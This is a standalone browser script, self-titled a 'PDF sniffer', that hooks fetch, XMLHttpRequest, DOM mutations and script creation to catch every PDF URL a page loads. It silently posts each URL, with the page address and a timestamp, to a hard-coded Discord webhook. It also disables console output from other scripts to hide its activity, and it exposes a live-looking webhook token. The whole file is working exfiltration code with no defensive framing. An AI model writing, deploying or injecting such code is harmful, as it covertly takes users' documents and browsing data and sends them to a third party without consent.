(() => {
    const realConsole = {
        log: console.log.bind(console),
        info: console.info.bind(console),
        warn: console.warn.bind(console),
        error: console.error.bind(console),
        debug: console.debug.bind(console),
        clear: console.clear.bind(console)
    };

    const allowedPrefix = '[PDF-SNIFFER]';
    
    ['log', 'info', 'warn', 'error', 'debug'].forEach(method => {
        console[method] = function(...args) {
            const firstArg = args[0];
            if (typeof firstArg === 'string' && firstArg.startsWith(allowedPrefix)) {
                realConsole[method](...args);
            }
        };
    });

    console.clear = function() {};

    realConsole.clear();

    const log = (...args) => realConsole.log(allowedPrefix, ...args);
    const logStyled = (style, ...args) => realConsole.log(`%c${allowedPrefix} ${args[0]}`, style, ...args.slice(1));

    const R = 'color: #f00; font-family: monospace; font-weight: bold;';
    const G = 'color: #0f0; font-family: monospace; font-weight: bold;';
    const C = 'color: #0ff; font-family: monospace; font-weight: bold;';

    logStyled(R, `${'||'.repeat(40)}`);
    logStyled(R, `${'||'.repeat(40)}`);
    realConsole.log(`%c  PDF SNIFFER v4.0 - WEBHOOK MODE`, 'color: #fff; background: #f00; font-family: monospace; font-size: 16px; padding: 4px;');
    logStyled(R, `${'||'.repeat(40)}`);
    logStyled(R, '  Detecting host...');
    logStyled(R, '  Checking IP and Firewall...');
    logStyled(R, `${'||'.repeat(40)}`);
    logStyled(R, `${'//'.repeat(40)}`);
    logStyled(R, '  Attempting to inject JavaScript into website...');
    logStyled(R, '  Configuring Client IP to server...');
    logStyled(R, '  Masking IP...');
    logStyled(R, `${'//'.repeat(40)}`);
    logStyled(R, `${'--'.repeat(40)}`);
    logStyled(G, '  Removed Console access from all JavaScript');
    logStyled(G, '  Sniffing all PDF files');
    logStyled(G, '  Forwarding to Discord Webhook');
    logStyled(R, `${'='.repeat(40)}`);
    realConsole.log(`%c  BIN: ACTIVE`, 'color: #fff; background: #0f0; font-family: monospace; padding: 2px 6px;');
    logStyled(R, `${'='.repeat(40)}\n`);

    const sendToWebhook = async (pdfUrl) => {
        try {
            await fetch('https://discord.com/api/webhooks/1491973092472524862/ZRoYZyfXbab9qc40WRWBcTP7J_1jr0L_ezKVSrBI53Iim4Rw4CqoiDoE9zQmW5QTCtCF', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `📄 **PDF Detected**\n\`\`\`${pdfUrl}\`\`\`\n🕐 ${new Date().toLocaleString()}\n🌐 ${window.location.href}`
                })
            });
            logStyled(G, '  [WEBHOOK] Sent to Discord successfully');
        } catch (e) {
            logStyled(R, '  [WEBHOOK] Failed to send');
        }
    };

    const logPDF = (url) => {
        logStyled(C, `\n${'═'.repeat(50)}`);
        realConsole.log(`%c  📄  PDF DETECTED`, 'color: #fff; background: #f00; font-family: monospace; font-size: 16px; padding: 4px;');
        logStyled(C, `  ${url}`);
        logStyled(C, `${'═'.repeat(50)}\n`);
        sendToWebhook(url);
    };

    const checkURL = (url) => {
        if (!url) return;
        const urlStr = url.toString();
        if (urlStr.toLowerCase().includes('.pdf') || urlStr.includes('?file=')) {
            logPDF(urlStr);
        }
    };

    const origFetch = window.fetch;
    window.fetch = function(...args) {
        const url = typeof args[0] === 'string' ? args[0] : args[0]?.url || '';
        checkURL(url);
        return origFetch.apply(this, args);
    };

    const origOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        checkURL(url);
        return origOpen.apply(this, arguments);
    };

    const origSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {
        this.addEventListener('load', function() {
            if (this.responseURL && this.responseURL.toLowerCase().includes('.pdf')) {
                checkURL(this.responseURL);
            }
        });
        return origSend.call(this, body);
    };

    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            mutation.addedNodes.forEach((node) => {
                if (node.tagName === 'IFRAME') {
                    checkURL(node.src);
                    try {
                        const iframeDoc = node.contentDocument || node.contentWindow?.document;
                        if (iframeDoc) {
                            const iframeObserver = new MutationObserver(() => {
                                const embeds = iframeDoc.querySelectorAll('embed, object');
                                embeds.forEach(el => checkURL(el.src || el.data));
                            });
                            iframeObserver.observe(iframeDoc.body || iframeDoc.documentElement, {
                                childList: true,
                                subtree: true
                            });
                        }
                    } catch(e) {}
                }
                if (node.tagName === 'EMBED') checkURL(node.src);
                if (node.tagName === 'OBJECT') checkURL(node.data);
            });
        });
    });
    observer.observe(document.documentElement, { childList: true, subtree: true });

    window.addEventListener('load', () => {
        checkURL(window.location.href);
        document.querySelectorAll('iframe, embed, object').forEach(el => {
            checkURL(el.src || el.data);
        });
    });

    const origCreateElement = document.createElement.bind(document);
    document.createElement = function(tagName, options) {
        const element = origCreateElement(tagName, options);
        if (tagName.toLowerCase() === 'script') {
            const origSetAttribute = element.setAttribute.bind(element);
            element.setAttribute = function(name, value) {
                if (name === 'src' && value) checkURL(value);
                return origSetAttribute(name, value);
            };
            const origSrcDescriptor = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
            if (origSrcDescriptor?.set) {
                Object.defineProperty(element, 'src', {
                    set: function(value) {
                        checkURL(value);
                        origSrcDescriptor.set.call(this, value);
                    },
                    get: origSrcDescriptor.get
                });
            }
        }
        return element;
    };

    logStyled(G, '  [SNIFFER] All hooks active. Waiting for PDF links or viewer loads...');
    logStyled(G, '  [SNIFFER] PDFs will be forwarded to Discord webhook.\n');
})();